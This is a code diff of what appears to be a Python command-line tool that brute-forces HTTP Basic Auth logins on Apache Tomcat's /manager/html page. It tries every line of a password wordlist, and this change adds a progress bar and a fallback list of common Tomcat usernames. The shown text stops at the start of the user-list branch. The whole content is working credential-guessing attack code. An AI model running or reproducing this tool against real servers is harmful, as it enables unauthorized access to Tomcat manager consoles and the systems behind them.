@@ -1,22 +1,68 @@
 import argparse
+import time
+
 import requests
 from requests.auth import HTTPBasicAuth
 from tqdm import tqdm
 from termcolor import *
+from rich.progress import (
+    BarColumn,
+    MofNCompleteColumn,
+    Progress,
+    TextColumn,
+    TimeElapsedColumn,
+    TimeRemainingColumn,
+)
+
+# progress_bar object - serve as a model
+progress_bar = Progress(
+    "{task.description}",
+    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+    BarColumn(),
+    MofNCompleteColumn(),
+    TextColumn("•"),
+    TimeElapsedColumn(),
+    TextColumn("•"),
+    TimeRemainingColumn(),
+)
+
+# common username list of tomcat's most common username - serve as backup if no user list
+common_username: list[str] = [
+    "admin",
+    "manager",
+    "role1",
+    "root",
+    "tomcat"
+]
 
 
-# Brute force mode fonction
+# Brute force mode function
 def brute(url: str, userlist: str, wordlist: str) -> tuple[str, str] | bool:
 
     # without user list
     if userlist is None:
         with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
-            for password in tqdm(open_wordlist):
-                password = password.strip()  # remove space or bad space
-                auth = HTTPBasicAuth('tomcat', password)
-                response = requests.get(f"{url}/manager/html", auth=auth)
-                if response.status_code == 200:
-                    return 'tomcat', password
+
+            length_wordlist = len(open_wordlist.readlines())
+
+            with Progress(*progress_bar.columns, transient=True) as progress:
+                task = progress.add_task(description="[violet] Brute force...", total=length_wordlist)
+
+                # Reset file pointer
+                open_wordlist.seek(0)
+                for password in open_wordlist:
+                    password = password.strip()  # remove space or bad space
+                    auth = HTTPBasicAuth('tomcat', password)
+                    response = requests.get(f"{url}/manager/html", auth=auth)
+
+                    # TODO : add an option --continue-on-success
+                    if response.status_code == 200:
+                        progress.update(task, completed=length_wordlist)
+                        time.sleep(1)
+                        return 'tomcat', password
+                    else:
+                        progress.advance(task)
+
     # with user list
     else:
         with open(userlist, "r", encoding="utf-8", errors="ignore") as open_userlist:
